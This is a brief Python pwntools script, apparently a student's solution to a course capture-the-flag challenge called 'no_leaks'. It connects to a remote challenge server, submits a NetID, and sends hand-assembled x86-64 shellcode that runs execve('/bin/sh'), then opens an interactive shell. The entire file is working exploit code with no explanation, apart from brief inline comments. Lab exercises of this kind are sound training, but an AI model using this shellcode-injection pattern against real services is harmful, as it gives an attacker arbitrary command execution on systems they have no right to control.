from pwn import *

context.arch = 'amd64'
e = ELF("no_leaks")
p = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1293)

p.recvuntil(b'NetID (something like abc123): ')
p.sendline(b'vc2499')

shellcode = asm('''
    xor rax, rax
    mov rdi, 0x68732f6e69622f  # "/bin/sh" in reverse
    push rdi
    mov rdi, rsp               # Point RDI to "/bin/sh"
    xor rsi, rsi               # NULL for argv
    xor rdx, rdx               # NULL for envp
    mov rax, 0x3b              # Syscall number for execve
    syscall                    # Execute syscall
''')

p.recvuntil(b"What can you do this time?")
p.sendline(shellcode)

p.interactive()

